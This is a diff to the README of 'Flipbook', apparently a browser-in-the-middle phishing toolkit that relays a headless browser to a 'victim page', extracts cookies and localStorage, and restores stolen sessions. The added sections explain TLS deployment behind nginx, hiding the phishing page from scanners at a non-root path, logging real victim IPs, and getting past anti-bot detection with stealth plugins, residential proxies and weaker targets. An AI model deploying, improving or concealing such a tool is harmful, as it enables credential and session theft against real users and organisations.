@@ -181,6 +181,8 @@ echo '/swapfile none swap sw 0 0' >> /etc/fstab
 | `http://HOST/api/config` | Returns configured target name (used by victim page) |
 | `http://HOST/healthz` | Health check |
 
+**Note:** When using nginx as a reverse proxy, you can configure the phishing page to appear at a non-root path (e.g., `/login/`) to hide from scanners. The root path can return 404 while `/login/` proxies to Flipbook. See the nginx configuration section for details.
+
 ---
 
 ## Victim payload
@@ -243,14 +245,17 @@ For production deployments, use nginx as a TLS-terminating reverse proxy. The in
 Run the included setup script as root:
 
 ```bash
-sudo bash setup-nginx.sh
+sudo bash setup-nginx-fixed.sh
 ```
 
 This will:
 1. Install nginx and certbot
-2. Configure nginx with your domain
-3. Obtain Let's Encrypt SSL certificate
-4. Enable nginx to start on boot
+2. Create temporary HTTP-only config (avoids chicken-and-egg SSL problem)
+3. Obtain Let's Encrypt SSL certificate via certbot
+4. Apply final HTTPS config with proper proxy settings
+5. Enable nginx to start on boot
+
+**Note:** The script creates an nginx config that properly proxies `/api/` endpoints (required for victim page initialization) and forwards real client IPs via `X-Forwarded-For` headers.
 
 ### Manual setup
 
@@ -259,9 +264,31 @@ This will:
 sudo apt-get update
 sudo apt-get install -y nginx certbot python3-certbot-nginx
 
-# Copy and configure nginx
-sudo cp nginx.conf /etc/nginx/sites-available/flipbook
-sudo sed -i 's/example\.com/yourdomain.com/g' /etc/nginx/sites-available/flipbook
+# Create temporary HTTP-only config (no SSL references)
+cat > /etc/nginx/sites-available/flipbook << 'EOF'
+server {
+    listen 80;
+    listen [::]:80;
+    server_name yourdomain.com;
+    
+    location /.well-known/acme-challenge/ {
+        root /var/www/html;
+    }
+    
+    location / {
+        proxy_pass http://127.0.0.1:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+}
+EOF
+
+# Enable site and remove default
 sudo ln -s /etc/nginx/sites-available/flipbook /etc/nginx/sites-enabled/
 sudo rm /etc/nginx/sites-enabled/default
 
@@ -270,12 +297,16 @@ sudo nginx -t
 sudo systemctl enable nginx
 sudo systemctl start nginx
 
-# Obtain SSL certificate
+# Obtain SSL certificate (certbot will modify the config)
 sudo certbot --nginx -d yourdomain.com
 
-# Reload nginx
+# Apply final config with SSL (replace example.com with your domain)
+sudo sed 's/example\.com/yourdomain.com/g' nginx.conf > /etc/nginx/sites-available/flipbook
+sudo nginx -t
 sudo systemctl reload nginx
 ```
+
+**Important:** The nginx config includes `X-Forwarded-For` headers which are used by Flipbook to display real victim IPs in the admin panel. Ensure Fastify's `trustProxy: true` is enabled in `src/server.ts` (already configured in current version).
 
 ### Certificate renewal
 
@@ -308,6 +339,32 @@ Hetzner CX31 (2 vCPU / 8 GB / €10/mo) is the recommended starting point.
 
 ---
 
+## Performance & Optimizations
+
+### Paste Timing
+Current paste operation timing (optimized for speed while maintaining reliability):
+- **Initial pause:** 120ms (allows field focus after click)
+- **Per-character delay:** 7ms (faster than typical human typing)
+
+These values can be adjusted in `src/input-handler.ts` if needed for specific targets.
+
+### IP Forwarding
+When using nginx as a reverse proxy, Flipbook correctly displays real victim IPs in the admin panel by:
+- Fastify configured with `trustProxy: true`
+- Socket.IO reads `X-Forwarded-For` headers
+- nginx sets proper proxy headers (configured in `nginx.conf`)
+
+### Anti-Bot Detection
+Flipbook includes the `puppeteer-extra-plugin-stealth` plugin to mask basic automation signals. However, modern anti-bot systems (Cloudflare, Akamai, etc.) use advanced fingerprinting that may still detect headless browsers. The tool works best against:
+- Internal corporate applications
+- Older authentication systems
+- Sites without sophisticated bot detection
+
+For sites with advanced protection, consider:
+- Using residential proxies
+- Testing with different user agents
+- Targeting less protected endpoints
+
 ## Project structure
 
 ```
@@ -319,6 +376,8 @@ src/
   input-handler.ts    — Mouse/keyboard forwarding with coordinate scaling
   session-extractor.ts — Cookie + localStorage extraction via CDP
   socket-handlers.ts  — All Socket.IO event registrations
+  session-logger.ts   — Session event logging to disk
+  metrics.ts          — Performance metrics collection
 
 public/
   victim.html         — Canvas-based victim page (no WebRTC)
@@ -327,4 +386,7 @@ public/
 tools/
   add-target.ts       — Interactive target setup
   session-restore.ts  — Session injection tool
+
+setup-nginx-fixed.sh  — Automated nginx + Let's Encrypt setup
+nginx.conf            — nginx reverse proxy configuration template
 ```
